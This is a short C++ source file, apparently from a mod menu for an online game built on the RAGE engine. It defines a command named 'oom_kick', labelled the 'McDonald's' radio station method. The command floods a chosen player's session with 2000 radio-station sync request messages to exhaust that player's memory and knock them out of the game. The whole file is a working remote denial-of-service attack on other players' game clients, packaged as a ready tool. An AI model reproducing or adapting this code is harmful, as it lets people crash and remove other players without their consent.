#include "commands/types/player/player_command.hpp"
#include "util/packet.hpp"

namespace commands
{
	class oom_kick : player_command
	{
		using player_command::player_command;

		void execute(player_ptr player, const command_arguments& _args) override
		{
			if (!player || !player->is_valid())
				return;

			packet msg{};

			msg.write_message(rage::eNetMessage::MSG_RADIO_STATION_SYNC_REQUEST);
			auto msg_id = player->get_session_player()->m_msg_id;

			for (int j = 0; j < 2000; j++)
			{
				msg.send(msg_id);
			}
		}
	};

	oom_kick g_oom_kick("McDonald's", "oom_kick", "Removes a player using the McDonald's radio station method", 0, false);
}
